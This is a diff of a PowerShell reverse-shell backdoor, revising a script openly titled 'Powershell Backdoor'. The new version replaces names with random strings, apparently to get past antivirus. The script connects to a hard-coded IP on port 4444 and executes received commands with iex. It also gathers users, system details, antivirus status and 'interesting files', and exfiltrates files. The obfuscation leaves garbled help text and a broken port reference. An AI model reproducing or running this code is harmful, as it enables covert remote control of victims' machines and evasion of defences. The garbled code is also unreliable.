@@ -1,22 +1,3 @@
-<#
-
-Powershell Backdoor
-Coded by Drew Alleman
-v0.0.0
-
-[+] Fetching clients public ip address
-[+] Listing local users
-[+] OS Information
-[+] BIOS Information
-[+] Active TCP Clients
-[+] Download Files from remote system
-[+] Find Intresting Files
-[+] Checks to see if common tools are installed
-
-[-] Find Writeable Directories
-
-#>
-
 function get_tools() {
     $tools = @("nmap -h", "nc -h", "wireshark -v", "python3 -V", 
     "python -V", "perl -V", "ruby -h", "hashcat -h", "john -h", 
@@ -39,7 +20,7 @@ function get_tools() {
 
 }
 
-function get_loot($help, $directory) {
+function get_loot($directory, $help) {
     if ($help -eq "--help") {
         return "Searches a directory for intresting files `nsyntax: get_loot --directory C:\"
     }
@@ -54,7 +35,7 @@ function get_loot($help, $directory) {
 
 function get_users($help) {
     if ($help -eq "--help") {
-        return "Lists all local users on the computer"
+        return "Lists all local users on the sTFcEqoSaJRhBD"
     }
 
     return Get-LocalUser | Select * | Out-String
@@ -62,7 +43,7 @@ function get_users($help) {
 
 function get_public_ip($help) {
     if ($help -eq "--help") {
-        return "Makes a network request to api.ipify.org to fetch the computers public IP address"
+        return "Makes a network request to api.ipify.org to fetch the sTFcEqoSaJRhBDs public IP address"
     }
     return (Invoke-WebRequest -uri "https://api.ipify.org/").Content | Out-String
 }
@@ -99,15 +80,15 @@ function get_antivirus($help) {
 
 function get_file($remote, $local, $help) {
      if ($help -eq "--help" -or $local -eq $null -or $remote -eq $null) {
-        return "Downloads a remote file and saves it to your computer `nsyntax: get_file <remote_path> <local_path>`nPlease use absolute paths!"
+        return "Downloads a remote file and saves it to your sTFcEqoSaJRhBD `nsyntax: get_file <remote_path> <local_path>`nPlease use absolute paths!"
     }
     try {
         $content = Get-Content -Path $remote
     } catch {
         $e = $_.Exception
         $msg = $e.Message
-        $output = "`n$msg`n" 
-        return $output 
+        $pAXGAqhcjjQQgm = "`n$msg`n" 
+        return $pAXGAqhcjjQQgm 
     }
     return $content
 }
@@ -118,43 +99,46 @@ function print_help() {
     get_os        - Gets infomation about the current OS build
     get_active    - Lists active TCP connections
     get_bios      - Gets the BIOS's manufacturer name, bios name, and firmware type
-    get_public_ip - Makes a network request to api.ipify.org to and returns the computers public IP address
+    get_public_ip - Makes a network request to api.ipify.org to and returns the sTFcEqoSaJRhBDs public IP address
     get_loot      - Searches a directory for intresting files --help (syntax)
     get_tools     - Checks to see what tools are installed on the system
-    get_file      - Downloads a remote file and saves it to your computer --help (syntax)
+    get_file      - Downloads a remote file and saves it to your sTFcEqoSaJRhBD --help (syntax)
     "
 }
 
-class Backdoor {
-    # Change this to the correct ip/port
-    [string]$ipAddress = "192.168.0.225"
-    [int]$port = 4444
-    $stream 
-    $client
-    $writer
-    $buffer
-    $reader
-    $encoding
+class BackdoorManager {
+    
+    # !!!!  DO NOT CHANGE THIS RUN backdoor.py !!!!
+    [string]$OcRkJVPhoRliEmITiEhwQgGY = "192.168.0.225"
+    # !!!!  DO NOT CHANGE THIS RUN backdoor.py !!!!
+    [int]$CphZmOjClFuyMGSWwh = 4444
 
-    createConnection() {
-        $this.client = New-Object Net.Sockets.TcpClient($this.ipAddress, $this.port);
-        $this.stream = $this.client.GetStream();
-        $this.buffer = New-Object Byte[] 1024;
-        $this.encoding = New-Object Text.UTF8Encoding;
-        $this.writer = New-Object IO.StreamWriter($this.stream, [Text.Encoding]::UTF8, 1024);
-        $this.reader = New-Object System.IO.StreamReader($this.stream)
-        $this.writer.AutoFlush = $true;
-        $this.handleClient()
+    $DqTAQCOTPdZD 
+    $iuONtdSGaNEzpU
+    $fYGXyBFkgYiSSwkTaihM
+    $IxsfJjAAJyaXGpanbczvg
+    $nKflNwp
+    $ioqmcSuTRybzVZxL
+
+    VhMePagsh() {
+        $this.iuONtdSGaNEzpU = New-Object Net.Sockets.TcpClient($this.OcRkJVPhoRliEmITiEhwQgGY, $this.port);
+        $this.DqTAQCOTPdZD = $this.iuONtdSGaNEzpU.GetStream();
+        $this.IxsfJjAAJyaXGpanbczvg = New-Object Byte[] 1024;
+        $this.ioqmcSuTRybzVZxL = New-Object Text.UTF8Encoding;
+        $this.fYGXyBFkgYiSSwkTaihM = New-Object IO.StreamWriter($this.DqTAQCOTPdZD, [Text.Encoding]::UTF8, 1024);
+        $this.nKflNwp = New-Object System.IO.StreamReader($this.DqTAQCOTPdZD)
+        $this.fYGXyBFkgYiSSwkTaihM.AutoFlush = $true;
+        $this.XqRZGIJWM()
 
     }
 
-    writeToStream($content) {
+    xGDVfpzYbvmh($content) {
         [byte[]]$bytes  = [text.Encoding]::Ascii.GetBytes($content)
-        $this.writer.Write($bytes,0,$bytes.length)     
+        $this.fYGXyBFkgYiSSwkTaihM.Write($bytes,0,$bytes.length)     
     }
 
-    handleClient() {
-        $this.writeToStream("
+    XqRZGIJWM() {
+        $this.xGDVfpzYbvmh("
      /| 
     / |ejm
    /__|______
@@ -166,35 +150,37 @@ class Backdoor {
   | |  ||  | |       [*] Use print_help to show all commands
   | |__||__| |       [*] Today's Date: $(date)
   |__________|`n`n")
-        while ($this.client.Connected) {
-                $currentUser = [Environment]::UserName
-                $computerName = [System.Net.Dns]::GetHostName()
-                $pwd = Get-Location
-                $prompt = "$currentUser@$computerName [$pwd]~$ "
-                $this.writeToStream($prompt)         
-                $rawResponse = $this.stream.Read($this.buffer, 0, 1024)    
-                $response = ($this.encoding.GetString($this.buffer, 0, $rawResponse))
-                $output = "`n"
-                if ([string]::IsNullOrEmpty($response)) {
+        while ($this.iuONtdSGaNEzpU.Connected) {
+             while ($this.iuONtdSGaNEzpU.DataAvailable) {
+                $khmTPpcihutXtlJhycRHZs = [Environment]::UserName
+                $sTFcEqoSaJRhBDName = [System.Net.Dns]::GetHostName()
+                $qvXUjrJAIMVZlEFej = Get-Location
+                $IwadBBRzC = "$khmTPpcihutXtlJhycRHZs@$sTFcEqoSaJRhBDName [$qvXUjrJAIMVZlEFej]~$ "
+                $this.xGDVfpzYbvmh($IwadBBRzC)         
+                $cVpAUXnR = $this.DqTAQCOTPdZD.Read($this.IxsfJjAAJyaXGpanbczvg, 0, 1024)    
+                $cFnGAcmUWutDwcJECXFA = ($this.ioqmcSuTRybzVZxL.GetString($this.IxsfJjAAJyaXGpanbczvg, 0, $cVpAUXnR))
+                $pAXGAqhcjjQQgm = "`n"
+                if ([string]::IsNullOrEmpty($cFnGAcmUWutDwcJECXFA)) {
                     continue
                 }
                 try { 
-                    $output = iex $response | Out-String
-                    $this.writeToStream($output + "`n")
+                    $pAXGAqhcjjQQgm = iex $cFnGAcmUWutDwcJECXFA | Out-String
+                    $this.xGDVfpzYbvmh($pAXGAqhcjjQQgm + "`n")
                     }
                  catch {
                     $e = $_.Exception
                     $msg = $e.Message
-                    $output = "`n$msg`n"  
-                    $this.writeToStream($output + "`n")
+                    $pAXGAqhcjjQQgm = "`n$msg`n"  
+                    $this.xGDVfpzYbvmh($pAXGAqhcjjQQgm + "`n")
                 }
+             }
         }     
-        # Clear the stream
-        $this.stream.Flush()
+        # Clear the DqTAQCOTPdZD
+        $this.DqTAQCOTPdZD.Flush()
         # Close the TCP socket
-        $this.client.Close()
+        $this.iuONtdSGaNEzpU.Close()
     }
 }
 
-$backdoor = [Backdoor]::new()
-$backdoor.createConnection()
+$backdoor = [BackdoorManager]::new()
+$backdoor.VhMePagsh()
